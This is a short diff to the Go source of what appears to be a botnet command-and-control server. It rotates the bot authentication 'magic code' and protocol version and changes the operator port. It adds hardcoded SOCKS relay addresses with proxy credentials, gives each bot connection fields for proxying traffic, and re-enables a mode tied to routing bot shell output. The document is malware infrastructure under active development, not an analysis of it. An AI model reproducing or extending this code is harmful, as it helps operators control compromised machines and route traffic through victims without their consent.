@@ -34,16 +34,23 @@ const (
 	USER_SERVER_IP = "0.0.0.0"
 	BOT_SERVER_IP  = "0.0.0.0"
 
-	//run setup.py dont try to change this yourself
+	// run setup.py dont try to change this yourself
 
 	// Server ports
 	BOT_SERVER_PORT  = "443" // do not change
-	USER_SERVER_PORT = "420"
+	USER_SERVER_PORT = "4245"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "^$Jxg5PWbuqE5&x&"
-	PROTOCOL_VERSION = "V3_1"
+	MAGIC_CODE       = "ijAa5NmBx3E7HTOx"
+	PROTOCOL_VERSION = "proto45"
 )
+
+// bakedRelayEndpoints holds relay addresses patched in by setup.py.
+// Format: "host:controlPort:socksPort" separated by commas.
+// Empty string means no pre-configured relays.
+var bakedRelayEndpoints = "1.2.52.1:9000,42.2.45.5:9001" // change me run setup.py
+var bakedProxyUser = "vision"                            // change me run setup.py
+var bakedProxyPass = "vision"                            // change me run setup.py
 
 type BotConnection struct {
 	conn          net.Conn
@@ -59,6 +66,9 @@ type BotConnection struct {
 	uplinkMbps    float64  // Uplink speed in Mbps
 	country       string   // GeoIP country code
 	userConn      net.Conn // Track which user is controlling this bot
+	socksActive   bool
+	socksRelay    string
+	socksUser     string
 }
 
 type client struct {
@@ -135,7 +145,7 @@ func main() {
 	if !runTUI && !runWebTor && !runSplit {
 		choices := RunLauncher()
 		runTUI = choices.TUI
-		runWebTor = false // WIP — disabled until shell output routing is fixed
+		runWebTor = choices.WebTor
 		runSplit = choices.Split
 	}
 
